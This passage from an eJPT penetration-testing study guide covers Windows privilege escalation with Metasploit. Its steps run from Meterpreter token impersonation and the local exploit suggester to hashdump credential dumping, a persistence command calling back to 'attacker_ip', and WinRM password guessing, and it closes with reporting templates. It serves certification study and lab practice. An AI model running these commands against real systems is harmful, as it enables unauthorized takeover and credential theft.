2. **"List all available tokens on the compromised system"**
   - Answer: Use `load incognito` then `list_tokens -u`

3. **"Escalate privileges to SYSTEM level using token impersonation"**
   - Answer: Use `impersonate_token "NT AUTHORITY\\SYSTEM"`

4. **"Find potential privilege escalation vulnerabilities automatically"**
   - Answer: Use `post/multi/recon/local_exploit_suggester`

---

## ‚ö†Ô∏è Common Problems and How to Fix Them

### **‚ùå Problem 1: No Tokens Available for Impersonation**

**What You See:**
```bash
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
No tokens available

Impersonation Tokens Available  
========================================
NT AUTHORITY\ANONYMOUS LOGON
```

**How to Fix:**
```bash
# Step 1: Try process migration to higher privilege process
meterpreter > ps
# Look for processes running as SYSTEM or Administrator

meterpreter > migrate [high_privilege_pid]
# Migrate to process with higher privileges

# Step 2: Try again after migration
meterpreter > list_tokens -u
# Should show more tokens after migration

# Step 3: Alternative - Use exploit suggester
meterpreter > background
use post/multi/recon/local_exploit_suggester
set SESSION 1
exploit
```

**Common Causes:**
- No privileged users logged in currently
- Current process has insufficient access to see tokens
- System is newly rebooted with minimal services

---

### **‚ùå Problem 2: Token Impersonation Fails**

**What You See:**
```bash
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is lost
[-] Delegation token not found
```

**How to Fix:**
```bash
# Step 1: Check available tokens again
meterpreter > list_tokens -u
# Verify SYSTEM token is actually available

# Step 2: Try exact token format
meterpreter > list_tokens -u | grep SYSTEM
# Copy exact format shown

meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
# Try without double backslash

# Step 3: Use getsystem instead
meterpreter > getsystem
# Automated privilege escalation alternative

# Step 4: Try impersonation tokens instead
meterpreter > list_tokens -g
meterpreter > impersonate_token "BUILTIN\\Administrators"
```

**Common Causes:**
- Wrong token format or spelling
- Insufficient privileges to impersonate
- Token not available in delegation list
- Security software blocking impersonation

---

### **‚ùå Problem 3: Local Exploit Suggester Finds Nothing**

**What You See:**
```bash
[*] 10.0.19.243 - Collecting local exploits for x86/windows...
[*] 10.0.19.243 - 176 exploit checks are being tried...
[*] 10.0.19.243 - Valid modules for session 1:
============================
[*] Post module execution completed
```

**How to Fix:**
```bash
# Step 1: Check system information
meterpreter > sysinfo
# Verify Windows version and architecture

# Step 2: Update Metasploit database
msfdb reinit
# Refresh exploit database

# Step 3: Try manual enumeration
meterpreter > shell
C:\> systeminfo
C:\> wmic qfe get Description,HotFixID,InstalledOn
# Check for missing patches manually

# Step 4: Check UAC status
C:\> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
# Look for UAC settings that might be bypassable
```

**Common Causes:**
- Fully patched system with no known vulnerabilities
- Outdated Metasploit exploit database
- Target architecture mismatch
- Advanced security software blocking enumeration

---

### **‚ùå Problem 4: WinRM Connection Failures**

**What You See:**
```bash
[*] 10.0.28.125:5985 - LOGIN FAILED: administrator:password123 (Incorrect: )
[-] 10.0.28.125:5985 - Unable to Connect: The connection request was rejected by the remote host.
```

**How to Fix:**
```bash
# Step 1: Verify WinRM service is actually running
nmap -p 5985,5986 -sV target_ip
# Confirm ports are open and service version

# Step 2: Test basic connectivity
telnet target_ip 5985
# Check if port accepts connections

# Step 3: Try HTTPS instead of HTTP
use auxiliary/scanner/winrm/winrm_login
set RHOSTS target_ip
set SSL true
set RPORT 5986
set USERNAME administrator
set PASSWORD password123
exploit

# Step 4: Check for authentication lockouts
# Wait 5-10 minutes between attempts
# Try different username formats
set USERNAME .\administrator
set USERNAME DOMAIN\administrator
```

**Common Causes:**
- WinRM service not properly configured
- Account lockout policy enabled
- Firewall blocking connections
- Wrong authentication method

---

## üîó Integration with Other Techniques

### **üéØ Complete Attack Chain: Initial Access ‚Üí Privilege Escalation ‚Üí Persistence**

#### **Phase 1: Starting from Low Privileges**
```bash
# After initial compromise (SMB, web shell, etc.)
meterpreter > getuid
# Current user: WORKSTATION\user1 (low privileges)

meterpreter > sysinfo
# Gather system information for escalation planning

# Document current access level
meterpreter > getprivs
# Note: Limited user privileges available
```

#### **Phase 2: Privilege Escalation Execution**
```bash
# Method 1: Try token impersonation first (fastest)
meterpreter > load incognito
meterpreter > list_tokens -u

# If tokens available
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"

# If no tokens, use automated suggester
meterpreter > background
use post/multi/recon/local_exploit_suggester
set SESSION 1
exploit

# Execute suggested exploit
use exploit/windows/local/[suggested_exploit]
set SESSION 1
exploit
```

#### **Phase 3: Post-Escalation Activities**
```bash
# Verify elevated access
meterpreter > getuid
# Expected: NT AUTHORITY\SYSTEM

# Dump system credentials
meterpreter > hashdump

# Install persistence mechanism
meterpreter > run persistence -S -U -X -i 5 -p 4444 -r attacker_ip

# Gather additional system information
meterpreter > run post/windows/gather/enum_computers
meterpreter > run post/windows/gather/enum_domain
```

### **‚öôÔ∏è Multiple Method Workflow:**

```bash
# Comprehensive privilege escalation workflow
#!/bin/bash
# Save as privilege_escalation_workflow.rc

# Method 1: Token Impersonation
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
getuid

# If token impersonation fails, try Method 2
background
use post/multi/recon/local_exploit_suggester  
set SESSION 1
exploit

# Method 3: If no local exploits, try service enumeration
sessions -i 1
shell
sc query type= service state= all
wmic service get name,pathname,displayname,startmode | findstr /i "auto"
exit

# Method 4: WinRM if network access available
background
use auxiliary/scanner/winrm/winrm_login
set RHOSTS target_network/24
set USERNAME administrator
set PASSWORD password123
exploit
```

---

## üìä Quick Command Reference

### **Essential Commands Summary:**

#### **Basic Status Commands:**
```bash
meterpreter > getuid                           # Check current user
meterpreter > sysinfo                          # System information
meterpreter > getprivs                         # Current privileges
meterpreter > ps                               # Running processes
```

#### **Token Impersonation Commands:**
```bash
meterpreter > load incognito                   # Load token module
meterpreter > list_tokens -u                   # List user tokens
meterpreter > list_tokens -g                   # List group tokens
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"  # Steal SYSTEM token
meterpreter > rev2self                         # Return to original user
```

#### **Automated Escalation Commands:**
```bash
use post/multi/recon/local_exploit_suggester   # Find vulnerabilities
set SESSION 1                                  # Set active session
use exploit/windows/local/[exploit_name]       # Use suggested exploit
set LHOST attacker_ip                          # Set callback IP
```

#### **Manual Enumeration Commands:**
```bash
# From shell session
systeminfo                                     # System configuration
whoami /all                                    # Current user details
net users                                      # Local user accounts
net localgroup administrators                  # Admin group members
sc query type= service state= all             # Service enumeration
```

### **Memory Tricks:**

#### **Easy Ways to Remember:**
- **getuid** = **get** **u**ser **id**entifier
- **load incognito** = **load** the **incognito** (hidden identity) module
- **impersonate_token** = **impersonate** (pretend to be) another user's **token**
- **NT AUTHORITY\SYSTEM** = **N**ew **T**echnology **AUTHORITY** **SYSTEM** (highest Windows privilege)
- **rev2self** = **rev**ert **to** original **self**

#### **Command Pattern for Escalation:**
```bash
# Remember: CHECK ‚Üí LOAD ‚Üí LIST ‚Üí STEAL ‚Üí VERIFY
getuid                  # Check current status
load incognito          # Load tools
list_tokens -u          # List available tokens  
impersonate_token       # Steal higher privilege token
getuid                  # Verify escalation success
```

---

## üìù Professional Reporting Templates

### **Quick Report Template:**
```markdown
## Windows Privilege Escalation Assessment

**Target System:** [target_ip]
**Date/Time:** [timestamp]  
**Initial Access:** [how_access_obtained]
**Starting Privileges:** [initial_user_level]

### Escalation Method Used:
**Technique:** Token Impersonation via Incognito
**Source Token:** NT AUTHORITY\SYSTEM
**Escalation Time:** < 3 minutes

### Final Access Level:
**User Context:** NT AUTHORITY\SYSTEM
**Privileges Gained:** [list key privileges]
**Administrative Capabilities:** Complete system control

### Evidence Collected:
- **Initial getuid output:** [starting_user]
- **Token enumeration results:** [available_tokens]  
- **Final getuid output:** NT AUTHORITY\SYSTEM
- **Privileges verification:** [getprivs output]

### Business Impact:
**Risk Level:** CRITICAL
**Impact:** Complete system compromise from limited user access
**Recommendations:** Implement privilege separation, monitor token usage
```

### **Detailed Technical Report:**
```markdown
## Technical Privilege Escalation Report

### Commands Executed:
```bash
# Initial reconnaissance
meterpreter > getuid
meterpreter > sysinfo
meterpreter > ps

# Token impersonation attempt
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"

# Verification
meterpreter > getuid
meterpreter > getprivs
```

### Vulnerability Analysis:
| Component | Status | Risk Level | Details |
|-----------|---------|------------|---------|
| Token Isolation | FAILED | CRITICAL | SYSTEM tokens accessible to user |
| Process Separation | INSUFFICIENT | HIGH | User can access privileged processes |
| Privilege Boundaries | BYPASSED | CRITICAL | Successful escalation to SYSTEM |

### Recommendations:
1. **Implement Token Restrictions:** Limit token access for standard users
2. **Process Isolation:** Strengthen process security boundaries  
3. **Privilege Monitoring:** Monitor and alert on privilege escalation attempts
4. **Regular Patching:** Apply security updates to prevent kernel exploits
```

---

## üéì Study Guide for eJPT Success

### **Essential Knowledge Checklist:**
- [ ] Understand Windows privilege levels (User, Administrator, SYSTEM)
- [ ] Know how to check current privileges (getuid, getprivs)
- [ ] Can load and use Incognito module for token impersonation
- [ ] Understand difference between delegation and impersonation tokens
- [ ] Know how to use local exploit suggester for automated detection
- [ ] Can execute suggested privilege escalation exploits
- [ ] Understand WinRM service and how to exploit it
- [ ] Can verify successful privilege escalation

### **Practice Scenarios:**
1. **Token Impersonation:** Steal SYSTEM token from user access
2. **Automated Escalation:** Use suggester to find and exploit vulnerabilities
3. **Service Exploitation:** Identify and abuse weak service permissions
4. **WinRM Abuse:** Exploit Windows Remote Management for privilege escalation
5. **UAC Bypass:** Circumvent User Access Control mechanisms

### **Time Management for Exam:**
- **Privilege Assessment:** Maximum 1 minute
- **Token Impersonation:** Maximum 3 minutes  
- **Automated Suggester:** Maximum 4 minutes
- **Exploit Execution:** Maximum 5 minutes
- **Verification:** Maximum 1 minute
- **Documentation:** Remaining time

---

## üîó Additional Learning Resources

### **Hands-on Practice:**
- **TryHackMe:** Search for "privilege escalation" rooms
- **HackTheBox:** Look for Windows machines requiring privilege escalation
- **VulnHub:** Download Windows VMs for offline practice
- **Local Lab:** Set up Windows VMs for safe testing

### **Setting Up Practice Lab:**
```bash
# Create Windows test environment
# 1. Download Windows 10/11 evaluation VM
# 2. Create standard user account
# 3. Install vulnerable software or disable UAC for testing
# 4. Practice escalation techniques safely
```

### **Books and Documentation:**
- "Windows Internals" - Understanding Windows security architecture
- "Metasploit: The Penetration Tester's Guide" - Privilege escalation chapters
- "Windows Privilege Escalation Fundamentals" - Detailed techniques guide

### **Video Resources:**
- YouTube: "Windows privilege escalation tutorials"
- Cybrary: Advanced Windows penetration testing
- INE: eJPT preparation materials with hands-on labs

### **Community Support:**
- Reddit: r/eJPT, r/AskNetSec  
- Discord: Penetration testing study groups
- Forums: Ethical hacking communities and study groups

---

## Quick Help and Troubleshooting

### **When Things Don't Work:**
1. **Check session status:** `sessions -l` to see active sessions
2. **Verify current context:** `getuid` to confirm user level
3. **Review system info:** `sysinfo` for OS version and architecture  
4. **Try process migration:** `migrate [pid]` to different process
5. **Use alternative methods:** If tokens fail, try exploit suggester

### **Emergency Commands:**
```bash
# Quick privilege check
meterpreter > getuid && getprivs

# Fast token enumeration
meterpreter > load incognito && list_tokens -u

# Automated escalation attempt  
meterpreter > background && use post/multi/recon/local_exploit_suggester && set SESSION 1 && exploit

# Return to original user if needed
meterpreter > rev2self
```

### **Getting Help:**
- **Metasploit help:** `help` command or `info` within modules
- **Module information:** `info [module_name]` for detailed options
- **Community forums:** Post specific error messages with context
- **Documentation:** Official Metasploit and Windows security documentation

---

## Final Notes for eJPT Success

Windows privilege escalation is a critical skill for penetration testing. Key points for exam success:

- **Master Token Impersonation** - This appears in most Windows scenarios
- **Know Automated Tools** - Exploit suggester saves significant time
- **Practice Multiple Methods** - Have backup approaches when primary fails
- **Verify Everything** - Always confirm escalation worked properly
- **Time Management** - Practice under pressure to build speed and confidence

This comprehensive guide covers all essential Windows privilege escalation techniques for both professional penetration testing and eJPT certification success. Regular practice with real Windows systems will build the expertise needed for exam success and real-world penetration testing scenarios.
